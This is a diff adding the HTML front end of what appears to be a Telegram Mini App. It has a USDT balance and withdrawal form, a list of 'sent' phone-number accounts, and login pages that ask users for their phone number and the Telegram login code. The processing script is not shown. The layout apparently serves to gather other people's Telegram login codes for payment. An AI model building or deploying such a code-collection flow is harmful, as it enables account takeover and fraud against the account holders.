@@ -1,0 +1,890 @@
+<html
+  lang="en"
+  style="
+    --tg-theme-bg-color: #ffffff;
+    --tg-theme-text-color: #000000;
+    --tg-theme-hint-color: #707579;
+    --tg-theme-link-color: #3390ec;
+    --tg-theme-button-color: #3390ec;
+    --tg-theme-button-text-color: #ffffff;
+    --tg-theme-secondary-bg-color: #f4f4f5;
+    --tg-theme-header-bg-color: #ffffff;
+    --tg-theme-accent-text-color: #3390ec;
+    --tg-theme-section-bg-color: #ffffff;
+    --tg-theme-section-header-text-color: #707579;
+    --tg-theme-subtitle-text-color: #707579;
+    --tg-theme-destructive-text-color: #e53935;
+  "
+>
+  <div
+    id="in-page-channel-node-id"
+    data-channel-name="in_page_channel_hH8k45"
+  ></div>
+
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <title>app</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style id="telegram-custom-styles">
+      * {
+        scrollbar-width: thin;
+        scrollbar-color: rgba(90, 90, 90, 0.3) transparent;
+      }
+
+      *::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+        background-color: transparent;
+      }
+
+      *::-webkit-scrollbar-thumb {
+        border-radius: 6px;
+        background-color: rgba(90, 90, 90, 0.3);
+      }
+
+      *::-webkit-scrollbar-corner {
+        background-color: transparent;
+      }
+
+      .status.active {
+        color: #3390ec !important;
+      }
+
+      .num-div {
+        display: flex;
+        flex-direction: column;
+        padding: 10px 20px;
+        gap: 7px;
+        margin-bottom: 5px;
+      }
+
+      .num-div div:not(:last-child) {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .num-div div:last-child {
+        display: flex;
+        flex-direction: row;
+        gap: 7px;
+      }
+
+      .num-div div:last-child button {
+        background-color: rgb(109, 207, 109);
+        color: rgb(36, 92, 36);
+        font-size: 11px;
+        padding: 2px 4px;
+        border-radius: 5px;
+        font-weight: bold;
+      }
+    </style>
+
+    <style>
+      /* --- Master Dark Mode Overrides --- */
+      .dark body,
+      .dark main,
+      .dark .page {
+        background-color: #0f172a !important; /* Slate 900 */
+        color: #f1f5f9 !important; /* Slate 100 */
+      }
+
+      /* Update all White Cards to Slate 800 */
+      .dark .bg-white,
+      .dark .bg-color-bg,
+      .dark .bg-color-section-bg {
+        background-color: #1e293b !important; /* Slate 800 */
+        border-color: #334155 !important; /* Slate 700 */
+      }
+
+      /* Secondary Backgrounds (Inputs/Loaders) */
+      /* .dark .bg-[#f8fafc],*/
+      .dark .bg-slate-50,
+      .dark .bg-color-secondary-bg {
+        background-color: #0f172a !important;
+      }
+
+      /* Text Color Overrides */
+      .dark .text-slate-900,
+      .dark .text-slate-800,
+      .dark .text-slate-700 {
+        color: #f8fafc !important;
+      }
+
+      .dark .text-slate-500,
+      .dark .text-slate-400,
+      .dark .text-color-hint {
+        color: #94a3b8 !important; /* Muted Slate */
+      }
+
+      /* Border Overrides */
+      .dark .border-slate-100,
+      .dark .border-slate-200,
+      .dark .border-slate-200\/60,
+      .dark .border-color-section-separator {
+        border-color: #334155 !important;
+      }
+
+      /* Header Glassmorphism Adjustment */
+      .dark .bg-white\/70 {
+        background-color: rgba(
+          15,
+          23,
+          42,
+          0.7
+        ) !important; /* Navy Transparent */
+        backdrop-filter: blur(12px);
+      }
+
+      /* Inputs and Buttons */
+      .dark input {
+        background-color: #1e293b !important;
+        color: white !important;
+        border-color: #334155 !important;
+      }
+
+      .dark input::placeholder {
+        color: #475569 !important;
+      }
+
+      /* Adjust Shadow intensity for dark mode 
+      .dark .shadow-sm,
+      .dark .shadow-xl {
+       shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5) !important;
+      }
+       */
+
+      /* 1. Page Slide Up (For when a new page appears) */
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* 2. Fade In (For simple elements) */
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      /* 3. Scale Up (For the Balance card and Icons) */
+      @keyframes scaleIn {
+        from {
+          opacity: 0;
+          transform: scale(0.9);
+        }
+        to {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      /* 4. Pulse for the 'Live Market' dot */
+      @keyframes softPulse {
+        0% {
+          transform: scale(1);
+          opacity: 1;
+        }
+        50% {
+          transform: scale(1.4);
+          opacity: 0.5;
+        }
+        100% {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      /* Apply classes to your elements */
+      .animate-page {
+        animation: slideUp 0.4s ease-out forwards;
+      }
+      .animate-fade {
+        animation: fadeIn 0.5s ease-in forwards;
+      }
+      .animate-card {
+        animation: scaleIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+      }
+      .live-dot {
+        animation: softPulse 2s infinite;
+      }
+
+      /* Staggered list animation (for the account list) */
+      .list-item-anim {
+        opacity: 0;
+        animation: slideUp 0.4s ease-out forwards;
+      }
+
+      /* Add delays so they pop in one by one */
+      .list-item-anim:nth-child(1) {
+        animation-delay: 0.1s;
+      }
+      .list-item-anim:nth-child(2) {
+        animation-delay: 0.15s;
+      }
+      .list-item-anim:nth-child(3) {
+        animation-delay: 0.2s;
+      }
+      .list-item-anim:nth-child(4) {
+        animation-delay: 0.25s;
+      }
+    </style>
+  </head>
+
+  <body class="animate-page">
+    <div id="loading-page" style="display: block" class="page">
+      <div>
+        <main class="flex h-screen w-full items-center justify-center">
+          <div class="w-full h-[80vh] flex items-center justify-center">
+            <svg class="animate-spin h-7 w-7" viewBox="0 0 100 101">
+              <path
+                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
+                fill="currentColor"
+              ></path>
+            </svg>
+          </div>
+        </main>
+      </div>
+    </div>
+
+    <div
+      id="main-page"
+      style="display: none"
+      class="page font-sans antialiased text-slate-900 animate-page"
+    >
+      <main class="flex min-h-screen flex-col bg-[#f8fafc]">
+        <header
+          class="sticky top-0 z-50 backdrop-blur-md bg-white/70 border-b border-slate-200/60"
+        >
+          <div class="flex items-center justify-between py-4 px-6">
+            <div class="flex items-center gap-4">
+              <div class="relative">
+                <img id="dp" width="50" style="border-radius: 50%; border: 1px solid grey;">
+                <span class="absolute -bottom-1 -right-1 flex h-4 w-4">
+                  <span
+                    class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"
+                  ></span>
+                  <span
+                    class="relative inline-flex rounded-full h-4 w-4 bg-green-500 border-2 border-white"
+                  ></span>
+                </span>
+              </div>
+              <div>
+                <h1 id="name" class="text-lg font-bold tracking-tight text-slate-800">
+                </h1>
+                <p
+                  id="user_id"
+                  class="text-xs font-mono text-slate-500 bg-slate-100 px-2 py-0.5 rounded-md"
+                >
+                </p>
+              </div>
+            </div>
+            <button
+              class="p-2 rounded-full hover:bg-slate-100 transition-colors"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="1.5"
+                stroke="currentColor"
+                class="w-6 h-6 text-slate-500"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M14.857 17.082a23.848 23.848 0 0 0 5.454-1.31A8.967 8.967 0 0 1 18 9.75V9A6 6 0 0 0 6 9v.75a8.967 8.967 0 0 1-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 0 1-5.714 0m5.714 0a3 3 0 1 1-5.714 0"
+                />
+              </svg>
+            </button>
+          </div>
+        </header>
+
+        <div class="px-5 py-8 space-y-6 flex-grow">
+          <div
+            class="bg-gradient-to-br from-slate-900 to-slate-800 rounded-[2rem] p-6 shadow-2xl shadow-slate-300 text-white relative overflow-hidden transition-transform active:scale-95"
+          >
+            <div class="relative z-10">
+              <p class="text-slate-400 text-sm font-medium mb-1">
+                Total Balance
+              </p>
+              <h2 class="text-3xl font-bold tracking-tight mb-4">
+                <span class="balance">0.00</span>
+                <span class="text-lg font-normal text-slate-400">USDT</span>
+              </h2>
+              <div class="flex gap-2">
+                <span
+                  class="text-[10px] bg-white/10 px-2 py-1 rounded-full backdrop-blur-md border border-white/10 text-green-400"
+                  >● Live Balance</span
+                >
+              </div>
+            </div>
+            <div
+              class="absolute -right-10 -top-10 h-40 w-40 bg-indigo-500/20 rounded-full blur-3xl"
+            ></div>
+          </div>
+
+          <section class="space-y-3">
+            <h3
+              class="px-2 text-xs font-bold uppercase tracking-widest text-slate-400"
+            >
+              Quick Actions
+            </h3>
+
+            <div class="grid gap-3">
+              <div
+                id="send_money"
+                class="group flex items-center justify-between bg-white p-4 rounded-2xl shadow-sm border border-slate-100 hover:shadow-md hover:border-indigo-100 transition-all cursor-pointer"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="p-3 rounded-xl bg-emerald-50 text-emerald-600 group-hover:bg-emerald-500 group-hover:text-white transition-colors"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke-width="2"
+                      stroke="currentColor"
+                      class="w-6 h-6"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3"
+                      />
+                    </svg>
+                  </div>
+                  <div>
+                    <p class="font-bold text-slate-700">Withdraw Money</p>
+                    <p class="text-xs text-slate-400">
+                      Instant transfer to wallet
+                    </p>
+                  </div>
+                </div>
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="2"
+                  stroke="currentColor"
+                  class="w-5 h-5 text-slate-300"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="m8.25 4.5 7.5 7.5-7.5 7.5"
+                  />
+                </svg>
+              </div>
+
+              <div
+                id="send_accts"
+                class="group flex items-center justify-between bg-white p-4 rounded-2xl shadow-sm border border-slate-100 hover:shadow-md hover:border-indigo-100 transition-all cursor-pointer"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="p-3 rounded-xl bg-blue-50 text-blue-600 group-hover:bg-blue-500 group-hover:text-white transition-colors"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke-width="2"
+                      stroke="currentColor"
+                      class="w-6 h-6"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z"
+                      />
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="flex items-center gap-2">
+                      <p class="font-bold text-slate-700">Send Accounts</p>
+                      <span
+                        class="text-[10px] font-bold bg-green-100 text-green-600 px-2 py-0.5 rounded-full uppercase tracking-tighter"
+                        >Available</span
+                      >
+                    </div>
+                    <p class="text-xs text-slate-400"><span id="total_accounts"></span> accounts active</p>
+                  </div>
+                </div>
+              </div>
+
+              <div
+                id="orders__"
+                class="group flex items-center justify-between bg-white p-4 rounded-2xl shadow-sm border border-slate-100 hover:shadow-md transition-all cursor-pointer"
+              >
+                <div class="flex items-center gap-4">
+                  <div
+                    class="p-3 rounded-xl bg-rose-50 text-rose-600 group-hover:bg-rose-500 group-hover:text-white transition-colors"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke-width="2"
+                      stroke="currentColor"
+                      class="w-6 h-6"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M12 6.042A8.967 8.967 0 0 0 6 3.75c-1.052 0-2.062.18-3 .512v14.25A8.987 8.987 0 0 1 6 18c2.305 0 4.408.867 6 2.292m0-14.25a8.966 8.966 0 0 1 6-2.25c1.052 0 2.062.18 3 .512v14.25A8.987 8.987 0 0 0 18 18c-2.305 0-4.408.867-6 2.292m0-14.25v14.25"
+                      />
+                    </svg>
+                  </div>
+                  <div>
+                    <p class="font-bold text-slate-700">Orders</p>
+                    <p class="text-xs text-slate-400">
+                      View transaction history
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <button
+            onclick="window.open('https://t.me/gill728', '_blank')"
+            class="w-full bg-indigo-50 border border-indigo-100 p-4 rounded-2xl flex items-center gap-4 active:scale-[0.98] transition-all"
+          >
+            <div
+              class="h-10 w-10 bg-indigo-600 rounded-full flex items-center justify-center text-white shadow-lg shadow-indigo-200"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke-width="2"
+                stroke="currentColor"
+                class="w-5 h-5"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M8.625 12a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0Zm0 0H8.25m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0Zm0 0H12m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0Zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 0 1-2.555-.337A5.972 5.972 0 0 1 5.41 20.97a5.969 5.969 0 0 1-.474-.065 4.48 4.48 0 0 0 .978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25Z"
+                />
+              </svg>
+            </div>
+            <div class="text-left">
+              <p class="text-sm font-bold text-indigo-900">Join our Telegram</p>
+              <p class="text-xs text-indigo-400">
+                Get the latest updates instantly
+              </p>
+            </div>
+          </button>
+        </div>
+
+        <footer class="pb-6 pt-2">
+          <p
+            class="text-center text-[10px] font-bold uppercase tracking-widest text-slate-300"
+          >
+            v0.1 by <span class="text-indigo-400">Kingstar</span>
+          </p>
+        </footer>
+      </main>
+    </div>
+
+    <div
+      id="withdraw-page"
+      style="display: none"
+      class="animate-page page font-sans antialiased text-slate-900"
+    >
+      <main class="flex min-h-screen flex-col bg-[#f8fafc]">
+        <header
+          class="sticky top-0 z-50 backdrop-blur-md bg-white/70 border-b border-slate-200/60"
+        >
+          <div class="flex items-center gap-4 py-4 px-6">
+            <h1 class="text-lg font-bold tracking-tight text-slate-800">
+              Withdraw USDT
+            </h1>
+          </div>
+        </header>
+
+        <div class="px-5 py-8 space-y-6">
+          <div
+            class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100"
+          >
+            <p
+              class="text-slate-400 text-xs font-bold uppercase tracking-wider mb-1"
+            >
+              Available for withdrawal
+            </p>
+            <h2 class="text-2xl font-bold text-slate-800">
+              <span class="balance">0.00</span> <span class="text-sm font-medium text-slate-400">USDT</span>
+            </h2>
+          </div>
+
+          <div
+            class="bg-white p-6 rounded-[2rem] shadow-xl shadow-slate-200/50 border border-slate-100 space-y-5"
+          >
+            <div>
+              <label class="block text-sm font-bold text-slate-700 mb-2 ml-1"
+                >Wallet Address</label
+              >
+              <input
+                id="withdraw_address"
+                type="text"
+                placeholder="Enter BEP20 Address"
+                class="w-full bg-slate-50 border border-slate-200 rounded-2xl px-4 py-3.5 text-sm focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-all outline-none"
+              />
+            </div>
+
+            <div>
+              <label class="block text-sm font-bold text-slate-700 mb-2 ml-1"
+                >Amount</label
+              >
+              <div class="relative">
+                <input
+                  id="withdraw_amount"
+                  type="number"
+                  placeholder="0.00"
+                  class="w-full bg-slate-50 border border-slate-200 rounded-2xl px-4 py-3.5 text-sm focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-all outline-none"
+                />
+                <span
+                  class="absolute right-4 top-3.5 font-bold text-slate-400 text-sm"
+                  >USDT</span
+                >
+              </div>
+              <p class="mt-2 text-[11px] text-slate-400 ml-1">
+                Minimum withdrawal: 10 USDT
+              </p>
+            </div>
+
+            <button
+              id="confirm_withdraw"
+              class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-indigo-200 active:scale-[0.98] transition-all mt-4"
+            >
+              Confirm Withdrawal
+            </button>
+          </div>
+
+          <div
+            class="flex gap-3 p-4 bg-amber-50 rounded-2xl border border-amber-100"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 20 20"
+              fill="currentColor"
+              class="w-5 h-5 text-amber-500 shrink-0"
+            >
+              <path
+                fill-rule="evenodd"
+                d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Zm-8-5a.75.75 0 0 1 .75.75v4.5a.75.75 0 0 1-1.5 0v-4.5A.75.75 0 0 1 10 5Zm0 10a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"
+                clip-rule="evenodd"
+              />
+            </svg>
+            <p class="text-xs text-amber-700 leading-relaxed">
+              Please ensure the wallet address is <b>BEP20</b>. Funds sent to
+              wrong addresses cannot be recovered.
+            </p>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <div
+      id="accts-page"
+      style="display: none"
+      class="animate-page page font-sans antialiased text-slate-900"
+    >
+      <main class="flex min-h-screen flex-col bg-[#f8fafc]">
+        <header
+          class="sticky top-0 z-50 backdrop-blur-md bg-white/70 border-b border-slate-200/60"
+        >
+          <div class="p-4">
+            <div class="relative group">
+              <div
+                class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="2"
+                  stroke="currentColor"
+                  class="w-5 h-5 text-slate-400 group-focus-within:text-indigo-500 transition-colors"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z"
+                  />
+                </svg>
+              </div>
+              <input
+                type="search"
+                inputmode="decimal"
+                placeholder="Search phone number..."
+                class="w-full bg-white border border-slate-200 rounded-2xl py-3 pl-11 pr-4 text-sm shadow-sm outline-none focus:ring-2 focus:ring-indigo-500/10 focus:border-indigo-500 transition-all"
+              />
+            </div>
+          </div>
+
+          <div class="flex justify-around relative px-2 pb-0">
+            <div
+              class="status active relative flex-1 text-center py-3 text-sm font-bold tracking-tight cursor-pointer transition-colors text-slate-400"
+            >
+              Pending
+            </div>
+            <div
+              class="status relative flex-1 text-center py-3 text-sm font-bold tracking-tight cursor-pointer transition-colors text-slate-400"
+            >
+              Accepted
+            </div>
+            <div
+              class="status relative flex-1 text-center py-3 text-sm font-bold tracking-tight cursor-pointer transition-colors text-slate-400"
+            >
+              Rejected
+            </div>
+          </div>
+        </header>
+
+        <div
+          class="his-loader flex flex-grow flex-col items-center justify-center p-10 hidden"
+        >
+          <div class="relative">
+            <div
+              class="h-12 w-12 rounded-full border-4 border-slate-100 border-t-indigo-500 animate-spin"
+            ></div>
+          </div>
+          <p
+            class="mt-4 text-xs font-bold text-slate-400 uppercase tracking-widest"
+          >
+            Loading Accounts
+          </p>
+        </div>
+
+        <div class="history px-5 py-6 hidden">
+          <ul id="accounts-ul" class="space-y-4">
+          </ul>
+        </div>
+      </main>
+    </div>
+
+    <div
+      id="show-account-page"
+      style="display: none"
+      class="animate-page page"
+    ></div>
+
+    <div
+      id="number-page"
+      style="display: none"
+      class="animate-page page font-sans antialiased text-slate-900"
+    >
+      <main class="flex min-h-screen flex-col bg-[#f8fafc]">
+        <div class="px-8 flex-grow flex flex-col mt-10">
+          <header
+            class="flex flex-col items-center justify-center space-y-4 py-8"
+          >
+            <div
+              class="h-20 w-20 rounded-[2.5rem] bg-gradient-to-tr from-indigo-600 to-violet-500 flex items-center justify-center shadow-2xl shadow-indigo-200 mb-2"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                viewBox="0 0 24 24"
+                fill="currentColor"
+                class="h-10 w-10 text-white"
+              >
+                <path
+                  d="M1.5 8.67v8.58a3 3 0 0 0 3 3h15a3 3 0 0 0 3-3V8.67l-8.928 5.493a1.35 1.35 0 0 1-1.394 0L1.5 8.67Z"
+                />
+                <path
+                  d="M22.5 6.908V6.75a3 3 0 0 0-3-3h-15a3 3 0 0 0-3 3v.158l9.714 5.978a1.5 1.5 0 0 0 1.572 0L22.5 6.908Z"
+                />
+              </svg>
+            </div>
+            <div class="text-center">
+              <h1 class="text-2xl font-black tracking-tight text-slate-800">
+                Login Account
+              </h1>
+              <p class="text-sm text-slate-400 mt-1 font-medium">
+                Please enter your account phone number
+              </p>
+            </div>
+          </header>
+
+          <div class="mt-8 space-y-6">
+            <div class="space-y-2">
+              <label
+                class="block text-xs font-bold uppercase tracking-widest text-slate-400 ml-1"
+                >Phone Number</label
+              >
+              <div class="relative group">
+                <div
+                  class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none"
+                >
+                  <span
+                    class="text-slate-400 font-bold text-sm group-focus-within:text-indigo-500 transition-colors"
+                    >+</span
+                  >
+                </div>
+                <input
+                  id="phone"
+                  type="text"
+                  inputmode="decimal"
+                  name="phone"
+                  placeholder="1 234 567 890"
+                  class="w-full bg-white border-2 border-slate-100 rounded-2xl py-4 pl-8 pr-4 text-lg font-bold tracking-tight shadow-sm outline-none focus:ring-4 focus:ring-indigo-500/5 focus:border-indigo-500 transition-all placeholder:text-slate-200 placeholder:font-normal"
+                />
+              </div>
+              <div id="phone-error" class="flex items-center gap-1.5 px-2 text-rose-500 hidden">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  viewBox="0 0 20 20"
+                  fill="currentColor"
+                  class="w-4 h-4"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Zm-8-5a.75.75 0 0 1 .75.75v4.5a.75.75 0 0 1-1.5 0v-4.5A.75.75 0 0 1 10 5Zm0 10a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"
+                    clip-rule="evenodd"
+                  />
+                </svg>
+                <p id="phone-error-text" class="text-[11px] font-bold uppercase tracking-wide">
+                  Invalid phone number
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <footer class="mt-auto pb-10">
+            <div
+              class="bg-indigo-50/50 rounded-2xl p-4 border border-indigo-100/50"
+            >
+              <p
+                class="text-[10px] text-center text-indigo-400 font-medium leading-relaxed"
+              >
+                By continuing, you agree to receive a verification code via SMS.
+                Standard rates may apply.
+              </p>
+            </div>
+          </footer>
+        </div>
+      </main>
+    </div>
+
+    <div
+      id="code-page"
+      style="display: none"
+      class="animate-page page font-sans antialiased text-slate-900"
+    >
+      <main class="flex min-h-screen flex-col bg-[#f8fafc]">
+        <div class="px-8 flex-grow flex flex-col mt-10">
+          <header
+            class="flex flex-col items-center justify-center text-center space-y-4 py-6"
+          >
+            <div
+              class="h-20 w-20 rounded-[2.5rem] bg-blue-50 flex items-center justify-center shadow-inner mb-2"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                viewBox="0 0 24 24"
+                fill="currentColor"
+                class="w-10 h-10 text-blue-500 animate-pulse"
+              >
+                <path
+                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.41 16.09V20h-2.82v-1.91c-.06-.01-.12-.03-.18-.05-1.3-.41-2.07-1.34-2.12-2.56h1.76c.05.58.41 1.05 1.15 1.25.75.21 1.54.06 1.94-.38.4-.44.38-1.07-.05-1.52-.39-.41-1.07-.71-2.03-1.01-1-.31-2.03-.69-2.65-1.39-.63-.71-.61-1.74-.01-2.48.59-.73 1.56-1.12 2.76-1.13V7h2.82v1.9c.12.02.24.05.35.08 1.12.33 1.87 1.13 1.97 2.23h-1.76c-.08-.52-.38-.93-1.03-1.11-.7-.2-1.38-.07-1.76.32-.38.39-.37.95.03 1.34.33.32.9.58 1.83.86 1.03.31 2.05.7 2.68 1.42.64.72.63 1.76.04 2.53-.6 0.77-1.59 1.17-2.81 1.2z"
+                />
+              </svg>
+            </div>
+
+            <h1 class="text-2xl font-black tracking-tight text-slate-800">
+              Enter Code
+            </h1>
+
+            <div
+              class="bg-blue-50/50 border border-blue-100/50 rounded-2xl p-4 mt-2"
+            >
+              <p class="text-sm text-slate-600 leading-relaxed">
+                We've sent a code to the
+                <span class="text-blue-600 font-bold">Telegram app</span> for
+                <span
+                  id="display-phone"
+                  class="text-slate-900 font-mono font-bold" 
+                  ></span
+                >
+              </p>
+            </div>
+          </header>
+
+          <div class="mt-8 space-y-6">
+            <div class="space-y-3">
+              <label
+                class="block text-xs font-bold uppercase tracking-widest text-slate-400 ml-1"
+                >Verification OTP</label
+              >
+              <input
+                id="code"
+                type="text"
+                inputmode="decimal"
+                name="code"
+                maxlength="5"
+                placeholder="0 0 0 0 0"
+                class="w-full bg-white border-2 border-slate-100 rounded-2xl py-5 text-center text-3xl font-black tracking-[0.5em] shadow-sm outline-none focus:ring-4 focus:ring-indigo-500/5 focus:border-indigo-500 transition-all placeholder:text-slate-100 placeholder:tracking-normal"
+              />
+
+              <div
+                class="flex items-center justify-center gap-1.5 text-rose-500"
+              >
+                <p id="code-error" class="text-[11px] font-bold uppercase tracking-widest hidden">
+                  Please enter a valid OTP code
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <footer class="mt-auto pb-10">
+            <div class="flex items-center justify-center gap-2 text-slate-300">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                viewBox="0 0 20 20"
+                fill="currentColor"
+                class="w-4 h-4"
+              >
+                <path
+                  fill-rule="evenodd"
+                  d="M10 1a4.5 4.5 0 0 0-4.5 4.5V9H5a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2h-.5V5.5A4.5 4.5 0 0 0 10 1Zm3 8V5.5a3 3 0 1 0-6 0V9h6Z"
+                  clip-rule="evenodd"
+                />
+              </svg>
+              <span class="text-[10px] font-bold uppercase tracking-[0.2em]"
+                >Secure Encryption</span
+              >
+            </div>
+          </footer>
+        </div>
+      </main>
+    </div>
+
+    <script type="module">
+      import { parsePhoneNumberFromString } from "https://cdn.jsdelivr.net/npm/libphonenumber-js@1.11.7/min/index.js";
+      window.getShort = (n) => {
+        const r = parsePhoneNumberFromString(n);
+        //alert(JSON.stringify(r))
+        return r?.country.toLowerCase()
+      }
+    </script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="public/app.js?v=1"></script>
+  </body>
+</html>
